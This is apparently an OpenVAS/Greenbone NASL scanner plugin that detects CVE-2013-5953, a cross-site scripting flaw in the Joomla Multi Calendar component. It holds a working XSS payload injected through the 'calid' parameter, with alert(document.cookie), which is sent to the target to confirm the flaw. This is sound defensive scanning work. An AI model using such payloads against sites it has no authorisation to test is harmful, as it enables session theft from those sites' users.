# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:joomla:joomla";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804337");
  script_version("2023-07-26T05:05:09+0000");
  script_cve_id("CVE-2013-5953");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-07-26 05:05:09 +0000 (Wed, 26 Jul 2023)");
  script_tag(name:"creation_date", value:"2014-03-17 19:46:07 +0530 (Mon, 17 Mar 2014)");

  script_name("Joomla Component Multi Calendar Multiple Cross Site Scripting Vulnerabilities");

  script_tag(name:"summary", value:"Joomla component Multi Calendar is prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to
read the cookie or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to insufficient validation of 'calid' and
'paletteDefault' HTTP GET parameters passed to 'index.php' script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary HTML
and script code in a users browser session in the context of an affected site and launch other attacks.");

  script_tag(name:"affected", value:"Joomla Component Multi Calendar version 4.0.2 and probably other versions");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the
disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to
a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_xref(name:"URL", value:"http://exploitsdownload.com/exploit/na/joomla-multi-calendar-402-cross-site-scripting");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66260");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/125738/Joomla-Multi-Calendar-4.0.2-Cross-Site-Scripting.html");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_mandatory_keys("joomla/installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if (!http_port = get_app_port(cpe:CPE))
  exit(0);

if (!dir = get_app_location(cpe:CPE, port:http_port))
  exit(0);

if (dir == "/")
  dir = "";

url = dir + '/index.php?option=com_multicalendar&task=editevent&calid=1";' +
            '</script><script>alert(document.cookie);</script>';

if(http_vuln_check(port:http_port, url:url, check_header:TRUE,
                   pattern:"<script>alert\(document.cookie\);</script>", extra_check:">Calendar")) {
  report = http_report_vuln_url(port: http_port, url: url);
  security_message(port: http_port, data: report);
  exit(0);
}

exit(99);
